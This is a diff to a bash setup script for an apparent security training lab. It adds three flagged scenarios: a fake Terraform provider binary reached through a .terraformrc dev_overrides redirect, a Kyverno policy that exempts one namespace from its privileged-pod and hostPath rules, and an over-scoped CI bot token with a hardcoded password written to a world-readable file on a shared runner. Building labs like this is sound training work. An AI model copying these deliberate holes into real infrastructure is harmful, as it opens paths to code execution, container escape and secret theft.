@@ -156,6 +156,92 @@ sc_k8s_4(){
   on "$HOST_K8S" "k3s kubectl -n argocd patch secret argocd-secret --type merge -p '{\"data\":{\"admin.password\":\"$PWB64\",\"admin.passwordMtime\":\"$MTB64\"}}' >/dev/null 2>&1; k3s kubectl -n argocd rollout restart deploy argocd-server >/dev/null 2>&1"
 }
 
+# ---- TF-1: malicious provider via .terraformrc redirect (provider plugin runs code on plan) ----
+# gap: the apply host trusts a redirected provider source (dev_overrides -> attacker dir). terraform
+# launches that "provider" binary on plan -> RCE as the apply identity.
+sc_tf_1(){
+  say "TF-1 malicious provider via .terraformrc redirect"
+  on "$HOST_TFEXEC" "echo '$(flag tf_1-malicious-provider)' > /home/deployer/tf1-flag.txt; chown deployer:deployer /home/deployer/tf1-flag.txt; chmod 600 /home/deployer/tf1-flag.txt
+install -d -m755 /opt/evilmirror
+cat > /opt/evilmirror/terraform-provider-null <<'SH'
+#!/usr/bin/env bash
+# masquerades as the null provider; terraform execs it on plan -> we run first
+cat /home/deployer/tf1-flag.txt > /tmp/tf1-proof 2>/dev/null
+exit 1
+SH
+chmod 755 /opt/evilmirror/terraform-provider-null
+cat > /home/deployer/.terraformrc <<'RC'
+disable_checkpoint = true
+provider_installation {
+  dev_overrides { \"registry.terraform.io/hashicorp/null\" = \"/opt/evilmirror\" }
+  direct {}
+}
+RC
+chown deployer:deployer /home/deployer/.terraformrc; chmod 644 /home/deployer/.terraformrc"
+}
+
+# ---- POL-3: Kyverno admission bypass — policy gap admits a privileged pod --------------
+# gap: the enforce policy is re-applied with a namespace EXCLUSION (ns alpha), so a privileged
+# hostPath pod there is admitted -> escapes to the node and reads a host-only flag.
+sc_pol_3(){
+  say "POL-3 Kyverno admission bypass (namespace-exclusion gap)"
+  on "$HOST_K8S" "echo '$(flag pol_3-kyverno-admission-bypass)' > /opt/minilab2/pol3-flag.txt; chmod 644 /opt/minilab2/pol3-flag.txt
+cat <<'YML' | k3s kubectl apply -f - >/dev/null 2>&1
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata: { name: baseline-restrict }
+spec:
+  validationFailureAction: Enforce
+  background: true
+  rules:
+    - name: no-privileged
+      match: { any: [{ resources: { kinds: ['Pod'] } }] }
+      exclude: { any: [{ resources: { namespaces: ['alpha'] } }] }
+      validate:
+        message: 'privileged containers are not allowed'
+        pattern:
+          spec:
+            =(containers):
+              - =(securityContext):
+                  =(privileged): 'false'
+    - name: no-hostpath
+      match: { any: [{ resources: { kinds: ['Pod'] } }] }
+      exclude: { any: [{ resources: { namespaces: ['alpha'] } }] }
+      validate:
+        message: 'hostPath volumes are not allowed'
+        pattern:
+          spec:
+            =(volumes):
+              - X(hostPath): 'null'
+YML"
+}
+
+# ---- PBAC-4: over-scoped token -> cross-team repo read (blast radius) -------------------
+# gap: a CI bot token is a member of a team it shouldn't be (platform) and is leaked onto the
+# shared runner; it reads another team's private repo / secrets.
+sc_pbac_4(){
+  say "PBAC-4 over-scoped token -> cross-team repo"
+  gitea_api POST /admin/users -d '{"username":"ci-bot","email":"ci-bot@minilab2.lab","password":"Ci-Bot-2026!","must_change_password":false}' >/dev/null 2>&1
+  gitea_api POST /orgs -d '{"username":"platform","visibility":"private"}' >/dev/null 2>&1
+  gitea_api POST /orgs/platform/repos -d '{"name":"secrets","private":true,"auto_init":true,"default_branch":"main"}' >/dev/null 2>&1
+  # plant the crown in platform/secrets
+  local W; W=$(mktemp -d)
+  if git clone -q "http://$ADMIN_USER:$ADMIN_PASS@gitea:3000/platform/secrets.git" "$W/s" 2>/dev/null; then
+    ( cd "$W/s"; echo "prod db password: $(flag pbac_4-overscoped-token)" > CROWN.md
+      gc add -A && gc commit -q -m "crown" && gc push -q origin main 2>/dev/null ); fi; rm -rf "$W"
+  # over-scope: add ci-bot to BOTH alpha (intended) and platform (the mistake)
+  for org in alpha platform; do
+    local tid; tid=$(gitea_api GET /orgs/$org/teams | jq -r '.[]|select(.name=="Owners").id' 2>/dev/null)
+    [ -n "$tid" ] && gitea_api PUT "/teams/$tid/members/ci-bot" >/dev/null 2>&1
+  done
+  # ci-bot PAT with full scope, LEAKED onto the shared runner (low-trust). Unique name => re-run safe.
+  local tok tname; tname="ci-$(date +%s)"
+  tok=$(curl -sS -X POST -u "ci-bot:Ci-Bot-2026!" -H 'Content-Type: application/json' \
+    "$GITEA/api/v1/users/ci-bot/tokens" \
+    -d "{\"name\":\"$tname\",\"scopes\":[\"read:repository\",\"write:repository\",\"read:organization\"]}" 2>/dev/null | jq -r .sha1 2>/dev/null)
+  [ -n "$tok" ] && on "$HOST_RUNNER" "printf 'GITEA_BOT_TOKEN=%s\n' '$tok' > /opt/ci-bot.env; chmod 644 /opt/ci-bot.env"
+}
+
 # ---- dispatcher ----
 ALL="ppe_1 ppe_2 ppe_3 pbac_1 pbac_2 pbac_3 pbac_4 sup_1 sup_2 sup_3 sup_4 sec_1 sec_2 \
      k8s_1 k8s_2 k8s_3 k8s_4 tf_1 tf_2 tf_3 tf_4 tf_5 tf_6 pol_1 pol_2 pol_3"
